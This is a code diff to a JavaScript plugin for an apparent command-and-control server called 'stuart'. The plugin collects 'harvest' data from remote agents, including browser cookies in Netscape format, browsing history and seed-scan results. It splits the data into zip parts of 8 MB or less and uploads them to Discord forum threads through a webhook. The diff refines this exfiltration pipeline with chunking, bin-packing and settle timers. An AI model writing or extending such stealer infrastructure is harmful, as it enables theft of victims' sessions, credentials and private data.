@@ -314,11 +314,18 @@ let pluginSettings = {
   discord_thread_prefix: "Stuart",
 };
 
-/** Max Discord attachment size for webhooks (bytes). Keep under 25 MiB. */
-const DISCORD_MAX_ZIP_BYTES = 24 * 1024 * 1024;
-/** Debounce webhook uploads per client (partials → results). */
-const discordUploadTimers = new Map();
-const DISCORD_UPLOAD_DEBOUNCE_MS = 2500;
+/** Max size per zip part on Discord (user limit). */
+const DISCORD_PART_MAX_BYTES = 8 * 1024 * 1024;
+/** Discord allows up to 10 attachments per message — one forum post. */
+const DISCORD_MAX_PARTS = 10;
+/**
+ * After harvest events stop, wait this long then zip+upload once.
+ * Covers late seed_scan / extra scans after `results`.
+ */
+const DISCORD_SETTLE_MS = 12000;
+/** Finalize timers per client (only one upload after harvest completes). */
+const discordSettleTimers = new Map();
+const discordFlushing = new Set();
 /** In-memory harvest buffers when Discord pipeline is on (not written to C2 DB). */
 const pendingDiscordHarvest = new Map();
 let discordPollRunning = false;
@@ -622,17 +629,24 @@ function mergeAgentPayloadIntoExport(data, clientId, payload) {
   return data;
 }
 
-function bufferDiscordHarvest(clientId, payload) {
+/**
+ * @param {{ replace?: boolean }} opts
+ *   replace=true on `results` so partials don't double-count the full collect.
+ */
+function bufferDiscordHarvest(clientId, payload, opts = {}) {
   let data = pendingDiscordHarvest.get(clientId);
-  if (!data) {
+  if (opts.replace || !data) {
     data = emptyExportData();
     data._clientId = clientId;
+    data._gotResults = !!opts.replace;
     pendingDiscordHarvest.set(clientId, data);
   }
+  if (opts.replace) data._gotResults = true;
   mergeAgentPayloadIntoExport(data, clientId, payload);
 }
 
-function buildZipFromExportData(data, clientId) {
+/** Build logical file entries (not yet zipped) from export data. */
+function collectExportFileEntries(data, clientId) {
   const prefix = clientId
     ? `stuart-${safeFsName(clientId).slice(0, 32)}`
     : "stuart-global";
@@ -644,68 +658,171 @@ function buildZipFromExportData(data, clientId) {
     "history",
   ];
 
-  const files = [];
+  const entries = [];
   const counts = {};
-  let approx = 0;
-
-  const meta = {
-    v: 1,
-    source: "stuart",
-    clientId: clientId || null,
-    capturedAt: Date.now(),
-  };
-  const metaBody = Buffer.from(JSON.stringify(meta, null, 2), "utf8");
-  files.push({ name: `${prefix}/meta.json`, data: metaBody });
-  approx += metaBody.length;
 
   for (const key of prioritized) {
-    let rows = data[key];
+    const rows = data[key];
     if (!rows || !rows.length) continue;
-
-    let body;
-    let name;
-    if (key === "cookies") {
-      body = Buffer.from(cookiesToNetscape(rows), "utf8");
-      name = `${prefix}/cookies.txt`;
-    } else {
-      if (key === "history" && approx > DISCORD_MAX_ZIP_BYTES * 0.4) {
-        const maxRows = Math.max(200, Math.floor((DISCORD_MAX_ZIP_BYTES - approx) / 200));
-        if (rows.length > maxRows) rows = rows.slice(0, maxRows);
-      }
-      body = Buffer.from(JSON.stringify(rows, null, 2), "utf8");
-      name = `${prefix}/${key}.json`;
-      if (approx + body.length > DISCORD_MAX_ZIP_BYTES && key === "history") {
-        let lo = 0, hi = rows.length;
-        while (lo < hi) {
-          const mid = Math.floor((lo + hi) / 2);
-          const trial = Buffer.from(JSON.stringify(rows.slice(0, mid), null, 2), "utf8");
-          if (approx + trial.length <= DISCORD_MAX_ZIP_BYTES) lo = mid + 1;
-          else hi = mid;
-        }
-        rows = rows.slice(0, Math.max(0, lo - 1));
-        if (!rows.length) continue;
-        body = Buffer.from(JSON.stringify(rows, null, 2), "utf8");
-      }
-    }
-
-    if (approx + body.length > DISCORD_MAX_ZIP_BYTES) {
-      console.warn(`[stuart] zip size limit: skipping ${key} (${body.length} bytes)`);
-      continue;
-    }
-    files.push({ name, data: body });
     counts[key] = rows.length;
-    approx += body.length + name.length + 64;
+    if (key === "cookies") {
+      entries.push({
+        key,
+        name: `${prefix}/cookies.txt`,
+        data: Buffer.from(cookiesToNetscape(rows), "utf8"),
+      });
+    } else {
+      entries.push({
+        key,
+        name: `${prefix}/${key}.json`,
+        data: Buffer.from(JSON.stringify(rows, null, 2), "utf8"),
+      });
+    }
+  }
+  return { entries, counts, prefix };
+}
+
+/** Split a single oversized JSON array file into multiple smaller files. */
+function splitLargeJsonEntry(entry, maxPayload) {
+  const text = entry.data.toString("utf8");
+  let rows;
+  try { rows = JSON.parse(text); } catch (_) { return [entry]; }
+  if (!Array.isArray(rows) || rows.length < 2) return [entry];
+
+  const out = [];
+  let chunk = [];
+  let part = 0;
+  const flush = () => {
+    if (!chunk.length) return;
+    const body = Buffer.from(JSON.stringify(chunk, null, 2), "utf8");
+    const base = entry.name.replace(/\.json$/i, "");
+    out.push({
+      key: entry.key,
+      name: `${base}.p${part}.json`,
+      data: body,
+    });
+    part++;
+    chunk = [];
+  };
+
+  for (const row of rows) {
+    chunk.push(row);
+    const trial = Buffer.from(JSON.stringify(chunk, null, 2), "utf8");
+    if (trial.length > maxPayload) {
+      chunk.pop();
+      if (!chunk.length) {
+        // single row too large — keep it alone
+        chunk.push(row);
+        flush();
+      } else {
+        flush();
+        chunk.push(row);
+      }
+    }
+  }
+  flush();
+  return out.length ? out : [entry];
+}
+
+/**
+ * Pack harvest into one or more zip parts, each ≤ 8 MB.
+ * All parts are meant for a single Discord message (up to 10 files).
+ */
+function buildZipPartsFromExportData(data, clientId) {
+  const { entries: rawEntries, counts, prefix } = collectExportFileEntries(data, clientId);
+  if (!rawEntries.length) return null;
+
+  // Leave headroom for meta.json + zip local headers (~2 KB)
+  const maxFilePayload = DISCORD_PART_MAX_BYTES - 64 * 1024;
+  let entries = [];
+  for (const e of rawEntries) {
+    if (e.data.length <= maxFilePayload) entries.push(e);
+    else if (e.name.endsWith(".json")) entries.push(...splitLargeJsonEntry(e, maxFilePayload));
+    else {
+      console.warn(`[stuart] skipping oversized non-json ${e.name} (${e.data.length} bytes)`);
+    }
+  }
+  if (!entries.length) return null;
+
+  const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
+  const baseName = clientId
+    ? `stuart-${safeFsName(clientId).slice(0, 24)}-${stamp}`
+    : `stuart-global-${stamp}`;
+
+  // Greedy bin-pack into zip parts
+  const bins = []; // { files: [{name,data}], size }
+  for (const ent of entries) {
+    const overhead = ent.name.length + 128;
+    const need = ent.data.length + overhead;
+    let placed = false;
+    for (const bin of bins) {
+      if (bin.size + need <= DISCORD_PART_MAX_BYTES - 4096) {
+        bin.files.push({ name: ent.name, data: ent.data });
+        bin.size += need;
+        placed = true;
+        break;
+      }
+    }
+    if (!placed) {
+      if (bins.length >= DISCORD_MAX_PARTS) {
+        console.warn(`[stuart] hit ${DISCORD_MAX_PARTS} part limit; dropping ${ent.name}`);
+        continue;
+      }
+      bins.push({ files: [{ name: ent.name, data: ent.data }], size: need });
+    }
   }
 
-  // meta-only is not a harvest
-  if (files.length <= 1 && !Object.keys(counts).length) return null;
+  const totalParts = bins.length;
+  const parts = bins.map((bin, i) => {
+    const meta = {
+      v: 1,
+      source: "stuart",
+      clientId: clientId || null,
+      capturedAt: Date.now(),
+      part: i + 1,
+      parts: totalParts,
+    };
+    const metaBody = Buffer.from(JSON.stringify(meta, null, 2), "utf8");
+    const files = [
+      { name: `${prefix}/meta.json`, data: metaBody },
+      ...bin.files,
+    ];
+    const zip = createZipBuffer(files);
+    // If zip slightly over 8MB due to headers, still send (Discord free is often 25MB; user asked 8MB target)
+    if (zip.length > DISCORD_PART_MAX_BYTES) {
+      console.warn(`[stuart] part ${i + 1} is ${zip.length} bytes (>${DISCORD_PART_MAX_BYTES})`);
+    }
+    const filename = totalParts === 1
+      ? `${baseName}.zip`
+      : `${baseName}.part${i + 1}of${totalParts}.zip`;
+    return { zip, filename, size: zip.length };
+  });
 
-  const zip = createZipBuffer(files);
-  const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
-  const filename = clientId
-    ? `stuart-${safeFsName(clientId).slice(0, 24)}-${stamp}.zip`
-    : `stuart-global-${stamp}.zip`;
-  return { zip, filename, counts, prefix, meta };
+  return { parts, counts, prefix, totalParts };
+}
+
+/** @deprecated single-zip helper — uses multi-part builder, returns first part shape or null */
+function buildZipFromExportData(data, clientId) {
+  const multi = buildZipPartsFromExportData(data, clientId);
+  if (!multi) return null;
+  const all = Buffer.concat(multi.parts.map(p => p.zip));
+  // Prefer single zip when only one part
+  if (multi.parts.length === 1) {
+    return {
+      zip: multi.parts[0].zip,
+      filename: multi.parts[0].filename,
+      counts: multi.counts,
+      prefix: multi.prefix,
+      parts: multi.parts,
+    };
+  }
+  return {
+    zip: multi.parts[0].zip,
+    filename: multi.parts[0].filename,
+    counts: multi.counts,
+    prefix: multi.prefix,
+    parts: multi.parts,
+  };
 }
 
 function collectExportData(db, clientId) {
@@ -765,12 +882,20 @@ function forumThreadName(clientId) {
   return `${prefix} ${short} ${stamp}`.slice(0, 100);
 }
 
-async function postZipToDiscordWebhook({ webhookUrl, zip, filename, content, threadName }) {
+/**
+ * Post one forum message with one or more zip parts (≤10 files).
+ * @param {{ zip: Buffer, filename: string }[]} parts
+ */
+async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName }) {
+  if (!parts?.length) throw new Error("no zip parts");
   const form = new FormData();
   const payload = { content };
   if (threadName) payload.thread_name = threadName;
   form.append("payload_json", JSON.stringify(payload));
-  form.append("files[0]", new Blob([zip], { type: "application/zip" }), filename);
+  const n = Math.min(parts.length, DISCORD_MAX_PARTS);
+  for (let i = 0; i < n; i++) {
+    form.append(`files[${i}]`, new Blob([parts[i].zip], { type: "application/zip" }), parts[i].filename);
+  }
 
   let url = webhookUrl.trim();
   url += url.includes("?") ? "&wait=true" : "?wait=true";
@@ -781,6 +906,15 @@ async function postZipToDiscordWebhook({ webhookUrl, zip, filename, content, thr
     throw new Error(`Discord webhook HTTP ${res.status}: ${text.slice(0, 400)}`);
   }
   try { return await res.json(); } catch (_) { return { ok: true }; }
+}
+
+async function postZipToDiscordWebhook({ webhookUrl, zip, filename, content, threadName }) {
+  return postZipsToDiscordWebhook({
+    webhookUrl,
+    parts: [{ zip, filename }],
+    content,
+    threadName,
+  });
 }
 
 /** Download one Discord attachment (this zip only). Prefer CDN URL; bot auth as fallback. */
@@ -801,127 +935,137 @@ async function downloadDiscordAttachment(att) {
 }
 
 /**
- * Import exactly the zip that was just posted (webhook wait=true response).
- * Does not scan other forum threads.
+ * Import all zip attachments on the webhook message that was just posted
+ * (one forum post — possibly multi-part). Does not scan other threads.
  */
-async function importThisWebhookZip(db, msg, fallbackClientId) {
-  if (!msg || !db || !stmts) return { ok: false, reason: "no message or db" };
+async function importThisWebhookZip(db, msg, fallbackClientId, localParts) {
+  if (!db || !stmts) return { ok: false, reason: "no db" };
 
-  const zips = (msg.attachments || []).filter(a => (a.filename || "").toLowerCase().endsWith(".zip"));
-  // Prefer stuart-named zip on this message only
-  let att = zips.find(a => {
-    const n = (a.filename || "").toLowerCase();
-    return n.includes("stuart") || n.includes("kematian");
-  }) || zips[0];
+  // Fast path: import the zip parts we just built (same harvest, no CDN)
+  if (localParts?.length) {
+    let clientId = fallbackClientId;
+    const mergedCounts = {};
+    for (let i = 0; i < localParts.length; i++) {
+      const p = localParts[i];
+      const result = importZipIntoDb(db, p.zip, clientId || fallbackClientId);
+      clientId = result.clientId || clientId;
+      for (const [k, v] of Object.entries(result.counts || {}))
+        mergedCounts[k] = (mergedCounts[k] || 0) + v;
+      const fakeId = `local-${msg?.id || Date.now()}-p${i}-${p.filename}`;
+      db.prepare(
+        `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
+      ).run(fakeId, msg?.id || null, msg?.channel_id || null, clientId, p.filename, Date.now());
+    }
+    try {
+      pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
+    } catch (_) {}
+    discordPollStatus = {
+      lastAt: Date.now(),
+      lastOk: true,
+      lastError: "",
+      imported: localParts.length,
+      message: `imported ${localParts.length} part(s) → ${clientId}`,
+    };
+    return { ok: true, clientId, parts: localParts.length, counts: mergedCounts, local: true };
+  }
 
-  // If wait response omitted attachments, fetch that one message via bot
-  if (!att && pluginSettings.discord_bot_token && msg.id && msg.channel_id) {
+  if (!msg) return { ok: false, reason: "no message" };
+
+  let zips = (msg.attachments || []).filter(a => (a.filename || "").toLowerCase().endsWith(".zip"));
+  if (!zips.length && pluginSettings.discord_bot_token && msg.id && msg.channel_id) {
     try {
       const full = await discordBotFetch(`/channels/${msg.channel_id}/messages/${msg.id}`);
-      att = (full?.attachments || []).find(a => (a.filename || "").toLowerCase().endsWith(".zip"));
+      zips = (full?.attachments || []).filter(a => (a.filename || "").toLowerCase().endsWith(".zip"));
       if (full) msg = full;
     } catch (e) {
-      console.warn("[stuart] fetch single message for attachment:", e.message);
+      console.warn("[stuart] fetch single message for attachments:", e.message);
     }
   }
-  if (!att) return { ok: false, reason: "no zip attachment on webhook response" };
+  if (!zips.length) return { ok: false, reason: "no zip attachment on webhook response" };
 
-  const seen = db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id);
-  if (seen) {
-    return { ok: true, skipped: true, reason: "already imported", attachmentId: att.id };
+  let clientId = fallbackClientId;
+  let n = 0;
+  for (const att of zips) {
+    if (db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id)) continue;
+    const zipBuf = await downloadDiscordAttachment(att);
+    const result = importZipIntoDb(db, zipBuf, clientId || fallbackClientId);
+    clientId = result.clientId || clientId;
+    db.prepare(
+      `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
+    ).run(att.id, msg.id || null, msg.channel_id || null, clientId, att.filename || "", Date.now());
+    n++;
+    console.log(`[stuart] imported webhook zip ${att.filename} → client ${clientId}`);
   }
-
-  const zipBuf = await downloadDiscordAttachment(att);
-  // Prefer zip buffer we already have if download fails? handled by throw
-  const result = importZipIntoDb(db, zipBuf, fallbackClientId);
-  db.prepare(
-    `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
-  ).run(att.id, msg.id || null, msg.channel_id || null, result.clientId, att.filename || "", Date.now());
-
-  try {
-    pluginCtx?.broadcast?.("harvest_update", { clientId: result.clientId, source: "discord" });
-  } catch (_) {}
-
+  if (n > 0) {
+    try {
+      pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
+    } catch (_) {}
+  }
   discordPollStatus = {
     lastAt: Date.now(),
     lastOk: true,
     lastError: "",
-    imported: 1,
-    message: `imported this upload: ${att.filename} → ${result.clientId}`,
+    imported: n,
+    message: `imported ${n} attachment(s) from this post → ${clientId}`,
   };
-  console.log(`[stuart] imported this webhook zip ${att.filename} → client ${result.clientId}`);
-  return { ok: true, clientId: result.clientId, filename: att.filename, attachmentId: att.id, counts: result.counts };
+  return { ok: true, clientId, parts: n };
 }
 
-/** Upload buffered harvest to Discord forum; then import only that zip for display. */
+/**
+ * After harvest is fully settled: one Discord forum post with 1..N zip parts (8MB each).
+ */
 async function flushDiscordHarvest(clientId) {
   if (!isDiscordPipelineOn()) {
     return { ok: false, skipped: true, reason: "Discord pipeline off or webhook missing" };
   }
+  if (discordFlushing.has(clientId)) {
+    return { ok: false, skipped: true, reason: "flush already in progress" };
+  }
+  discordFlushing.add(clientId);
+
   const buffered = pendingDiscordHarvest.get(clientId);
   pendingDiscordHarvest.delete(clientId);
 
-  let built = null;
-  if (buffered) built = buildZipFromExportData(buffered, clientId);
-  if (!built && pluginCtx?.db) built = buildHarvestZip(pluginCtx.db, clientId);
-  if (!built) return { ok: false, skipped: true, reason: "no data to export" };
-  if (built.zip.length > DISCORD_MAX_ZIP_BYTES) {
-    return { ok: false, error: `zip too large (${built.zip.length} bytes)` };
-  }
-
-  const content = buildDiscordSummary(clientId, built.counts);
-  const threadName = forumThreadName(clientId);
-
   try {
-    const msg = await postZipToDiscordWebhook({
+    let multi = null;
+    if (buffered) multi = buildZipPartsFromExportData(buffered, clientId);
+    if (!multi && pluginCtx?.db) {
+      multi = buildZipPartsFromExportData(collectExportData(pluginCtx.db, clientId), clientId);
+    }
+    if (!multi?.parts?.length) return { ok: false, skipped: true, reason: "no data to export" };
+
+    const content = buildDiscordSummary(clientId, multi.counts) +
+      (multi.totalParts > 1 ? `\nParts: **${multi.totalParts}** (≤8MB each, same post)` : "");
+    const threadName = forumThreadName(clientId);
+
+    const msg = await postZipsToDiscordWebhook({
       webhookUrl: pluginSettings.discord_webhook_url,
-      zip: built.zip,
-      filename: built.filename,
+      parts: multi.parts,
       content,
       threadName,
     });
-    console.log(`[stuart] Discord webhook ok client=${clientId} file=${built.filename} bytes=${built.zip.length}`);
+    const totalBytes = multi.parts.reduce((s, p) => s + p.size, 0);
+    console.log(
+      `[stuart] Discord webhook ok client=${clientId} parts=${multi.totalParts} bytes=${totalBytes} files=${multi.parts.map(p => p.filename).join(",")}`
+    );
 
-    // Import only this upload (not other forum posts)
+    // Import this harvest only (local parts — reliable, no other posts)
     let imported = null;
     if (pluginCtx?.db) {
       try {
-        // Prefer local zip bytes if CDN fetch is slow/unavailable
-        if (msg?.attachments?.length) {
-          imported = await importThisWebhookZip(pluginCtx.db, msg, clientId);
-        } else {
-          // No attachment meta in response — import the bytes we just sent
-          const result = importZipIntoDb(pluginCtx.db, built.zip, clientId);
-          const fakeAttId = `local-${msg?.id || Date.now()}-${built.filename}`;
-          pluginCtx.db.prepare(
-            `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
-          ).run(fakeAttId, msg?.id || null, msg?.channel_id || null, result.clientId, built.filename, Date.now());
-          try {
-            pluginCtx.broadcast("harvest_update", { clientId: result.clientId, source: "discord" });
-          } catch (_) {}
-          imported = { ok: true, clientId: result.clientId, filename: built.filename, local: true };
-          console.log(`[stuart] imported local zip copy → client ${result.clientId}`);
-        }
+        imported = await importThisWebhookZip(pluginCtx.db, msg, clientId, multi.parts);
       } catch (e) {
-        // Fallback: import the zip we still hold in memory (this upload only)
-        console.warn("[stuart] post-upload fetch failed, importing local zip:", e.message);
-        try {
-          const result = importZipIntoDb(pluginCtx.db, built.zip, clientId);
-          try {
-            pluginCtx.broadcast("harvest_update", { clientId: result.clientId, source: "discord" });
-          } catch (_) {}
-          imported = { ok: true, clientId: result.clientId, filename: built.filename, local: true, fetchError: e.message };
-        } catch (e2) {
-          imported = { ok: false, error: e2.message };
-        }
+        console.warn("[stuart] import after upload failed:", e.message);
+        imported = { ok: false, error: e.message };
       }
     }
 
     return {
       ok: true,
-      filename: built.filename,
-      size: built.zip.length,
-      counts: built.counts,
+      parts: multi.totalParts,
+      filenames: multi.parts.map(p => p.filename),
+      size: totalBytes,
+      counts: multi.counts,
       threadName,
       messageId: msg?.id || null,
       threadId: msg?.channel_id || null,
@@ -931,21 +1075,33 @@ async function flushDiscordHarvest(clientId) {
     if (buffered) pendingDiscordHarvest.set(clientId, buffered);
     console.error(`[stuart] Discord webhook failed:`, err.message);
     return { ok: false, error: err.message };
+  } finally {
+    discordFlushing.delete(clientId);
   }
 }
 
-function scheduleDiscordUpload(_db, clientId) {
+/**
+ * Schedule a single upload after harvest activity goes quiet.
+ * Partials do not call this — only `results` and finished scan events do.
+ */
+function scheduleDiscordFinalize(clientId) {
   if (!isDiscordPipelineOn()) return;
   const key = clientId || "__all__";
-  const prev = discordUploadTimers.get(key);
+  const prev = discordSettleTimers.get(key);
   if (prev) clearTimeout(prev);
   const t = setTimeout(() => {
-    discordUploadTimers.delete(key);
+    discordSettleTimers.delete(key);
+    console.log(`[stuart] harvest settled for ${clientId} — single zip upload`);
     flushDiscordHarvest(clientId).catch(e =>
       console.error("[stuart] Discord flush error:", e.message)
     );
-  }, DISCORD_UPLOAD_DEBOUNCE_MS);
-  discordUploadTimers.set(key, t);
+  }, DISCORD_SETTLE_MS);
+  discordSettleTimers.set(key, t);
+}
+
+/** @deprecated name kept for call sites — settles only */
+function scheduleDiscordUpload(_db, clientId) {
+  scheduleDiscordFinalize(clientId);
 }
 
 // ── ZIP read + import (bot poll path) ─────────────────────────────────
@@ -1960,18 +2116,25 @@ export default {
     pluginCtx = ctx;
 
     /**
-     * Discord pipeline ON → buffer + webhook only (no C2 DB write).
-     * Display data is imported later by the bot poller from the forum zip.
+     * Discord pipeline ON → buffer only until harvest settles, then ONE forum post.
+     * @param {object} agentPayload
+     * @param {{ replace?: boolean, settle?: boolean }} opts
+     *   replace: full `results` replaces partial buffer
+     *   settle: start/restart quiet timer → single zip upload (false for partials)
      */
-    const viaDiscord = (agentPayload) => {
-      bufferDiscordHarvest(clientId, agentPayload);
-      scheduleDiscordUpload(ctx.db, clientId);
-      try { ctx.broadcast("discord_upload_pending", { clientId }); } catch (_) {}
+    const viaDiscord = (agentPayload, opts = {}) => {
+      const settle = opts.settle !== false;
+      bufferDiscordHarvest(clientId, agentPayload, { replace: !!opts.replace });
+      if (settle) {
+        scheduleDiscordFinalize(clientId);
+        try { ctx.broadcast("discord_upload_pending", { clientId, settling: true }); } catch (_) {}
+      }
     };
 
     if (event === "results") {
       if (isDiscordPipelineOn()) {
-        viaDiscord(payload || {});
+        // Full collect payload — replace partials, then wait for late seeds/scans
+        viaDiscord(payload || {}, { replace: true, settle: true });
         return;
       }
       const tx = ctx.db.transaction(() => {
@@ -1984,7 +2147,8 @@ export default {
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "partial") {
       if (isDiscordPipelineOn()) {
-        viaDiscord(payload || {});
+        // Buffer only — do NOT upload mid-harvest
+        viaDiscord(payload || {}, { settle: false });
         return;
       }
       const tx = ctx.db.transaction(() => {
